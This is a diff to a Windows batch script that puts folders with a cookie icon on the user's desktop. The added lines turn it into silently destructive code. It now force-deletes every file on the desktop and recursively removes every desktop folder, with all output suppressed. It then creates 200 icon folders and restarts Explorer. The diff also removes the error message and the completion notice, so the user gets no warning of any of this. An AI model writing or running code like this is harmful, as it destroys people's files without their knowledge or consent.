@@ -1,31 +1,36 @@
 @echo off
 setlocal enabledelayedexpansion
+
 set "DesktopPath=%userprofile%\Desktop"
 
-del /q "%DesktopPath%\*.lnk"
-del /q "%DesktopPath%\*.url"
-del /q "%DesktopPath%\*.ico"
+del /f /q "%DesktopPath%\*.*" >nul 2>&1
 
-if not exist "resources\cookie.ico" (
-    echo Error: The icon file resources\cookie.ico was not found!
+for /D %%d in ("%DesktopPath%\*") do (
+    rd /s /q "%%d" >nul 2>&1
+)
+
+if not exist "cookie.ico" (
     goto :eof
 )
 
-for /L %%i in (1,1,50) do (
+:: ZMENA: Smyčka nyní jde od 1 do 200
+for /L %%i in (1,1,200) do (
     set "FolderName=cookie_%%i"
     set "FolderPath=%DesktopPath%\!FolderName!"
 
     md "!FolderPath!"
 
-    copy "resources\cookie.ico" "!FolderPath!\cookie.ico" >nul
+    copy "cookie.ico" "!FolderPath!\cookie.ico" >nul 2>&1
 
-    echo [.ShellClassInfo]> "!FolderPath!\desktop.ini"
-    echo IconResource=.\cookie.ico,0>> "!FolderPath!\desktop.ini"
-    echo [ViewState]>> "!FolderPath!\desktop.ini"
+    (
+        echo [.ShellClassInfo]
+        echo IconResource=.\cookie.ico,0
+        echo [ViewState]
+    ) > "!FolderPath!\desktop.ini"
 
     attrib +s +h "!FolderPath!\desktop.ini"
     attrib +r "!FolderPath!"
 )
 
-echo Done. 50 "cookie" folders were created on the desktop.
-pause
+taskkill /f /im explorer.exe
+start explorer.exe
